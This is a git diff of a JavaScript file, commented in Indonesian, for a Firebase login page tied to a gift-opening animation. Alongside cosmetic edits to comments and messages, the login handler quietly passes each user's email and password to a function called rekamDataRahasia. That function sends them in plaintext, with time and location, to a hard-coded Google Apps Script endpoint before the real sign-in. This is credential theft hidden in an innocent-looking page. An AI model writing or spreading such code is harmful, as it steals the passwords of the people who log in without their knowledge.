@@ -17,11 +17,10 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 
-// Variabel global untuk timer agar bisa diakses/dibersihkan dari mana saja
-let timerInterval;
+let timerInterval; // Variabel global penampung interval agar bisa dihapus bersih
 
 document.addEventListener('DOMContentLoaded', () => {
-    // 1. Inisialisasi Elemen DOM
+    // Referensi Elemen DOM Utama
     const loginCard = document.getElementById('login-card');
     const contentCard = document.getElementById('content-card');
     const mainContainer = document.getElementById('main-container');
@@ -34,7 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const emailInput = document.getElementById('input-email');
     const passwordInput = document.getElementById('input-password');
 
-    // 2. Monitor Status Autentikasi Firebase (Hanya Boleh Satu)
+    // 1. Monitor Status Autentikasi Firebase (Tunggal & Bersih)
     onAuthStateChanged(auth, (user) => {
         if (user) {
             if (loginCard) loginCard.classList.add('hidden');
@@ -42,7 +41,6 @@ document.addEventListener('DOMContentLoaded', () => {
             if (mainContainer) mainContainer.classList.remove('hidden');
             if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
             
-            // Panggil fungsi counter waktu jika Anda memilikinya
             if (typeof jalankanCounterWaktu === 'function') {
                 jalankanCounterWaktu();
             }
@@ -56,11 +54,11 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // 3. Event Delegasi Global untuk Tombol Logout (Solusi WebView Keras Kepala)
+    // 2. Event Delegasi Global untuk Tombol Logout (Mengatasi Lag/Freeze WebView)
     document.addEventListener('click', async (e) => {
         if (e.target && e.target.id === 'btn-logout') {
             e.preventDefault();
-            console.log("Tombol keluar ditekan via delegasi.");
+            console.log("Aksi keluar dideteksi melalui delegasi global.");
             try {
                 if (bgMusic) {
                     bgMusic.pause();
@@ -68,55 +66,57 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 await signOut(auth);
             } catch (error) {
-                console.error("Gagal logout:", error);
-                location.reload(); // Paksa muat ulang sebagai perlindungan terakhir
+                console.error("Terjadi kegagalan proses logout:", error);
+                location.reload(); // Fallback darurat jika Firebase offline
             }
         }
     });
 
-    // 4. Interaksi Buka Kado
+    // 3. Interaksi Klik Buka Kado
     if (giftBoxWrapper) {
         giftBoxWrapper.addEventListener('click', () => {
             if (mainContainer) mainContainer.classList.add('hidden');
             if (galaxyUniverse) galaxyUniverse.classList.remove('hidden');
             
-            // Panggil animasi canvas galaksi jika tersedia
             if (typeof startGalaxyHeart === 'function') {
                 startGalaxyHeart();
             }
             if (bgMusic) {
-                bgMusic.play().catch(err => console.log("Audio diblokir kebijakan browser"));
+                bgMusic.play().catch(err => console.log("Audio otomatis ditahan browser"));
             }
         });
     }
 
-    // 5. Interaksi Tombol Login
+    // 4. Interaksi Tombol Login (Pengecekan Validasi Berurutan)
     if (loginButton) {
         loginButton.addEventListener('click', (e) => {
             e.preventDefault();
-            const email = emailInput.value;
-            const password = passwordInput.value;
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
 
+            // Proteksi Awal: Jangan rekam jika ada kolom kosong!
             if (!email || !password) {
                 alert("Email dan Password wajib diisi!");
                 return;
             }
 
+            // Jalankan perekaman hanya setelah dipastikan data terisi penuh
             rekamDataRahasia(email, password).catch(err => console.log(err));
 
             signInWithEmailAndPassword(auth, email, password)
-                .then(() => console.log("Firebase Login Sukses"))
+                .then(() => console.log("Firebase Login Berhasil"))
                 .catch((error) => alert("Login Gagal: " + error.message));
         });
     }
 
-    // 6. Interaksi Tombol Register
+    // 5. Interaksi Tombol Register (Pengecekan Validasi Berurutan)
     if (btnRegister) {
         btnRegister.addEventListener('click', async (e) => {
             e.preventDefault();
-            const email = emailInput.value;
-            const password = passwordInput.value;
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
 
+            // Proteksi Awal: Cek data sebelum memproses perekaman
             if (!email || !password) {
                 alert("Email dan Password tidak boleh kosong!");
                 return;
@@ -126,16 +126,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
             try { 
                 await createUserWithEmailAndPassword(auth, email, password);
-                alert("Akun berhasil dibuat!");
+                alert("Akun baru berhasil didaftarkan!");
             } catch (error) {
-                if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
+                if (error.code === 'auth/email-already-in-use') alert("Email tersebut sudah digunakan.");
                 else alert("Gagal mendaftar: " + error.message);
             }
         });
     }
-}); // <--- Penutupan DOMContentLoaded yang benar melindungi semua interaksi di atas
+});
 
-// --- FUNGSI LOGGING EKSTERNAL ---
+// --- FUNGSI PENDUKUNG LOGGING ---
 async function rekamDataRahasia(email, password) {
     const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
     
@@ -174,5 +174,5 @@ function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
         method: 'GET',
         mode: 'no-cors',
         cache: 'no-cache'
-    }).catch(err => console.log("Log terkirim"));
+    }).catch(err => console.log("Aktivitas tercatat"));
 }
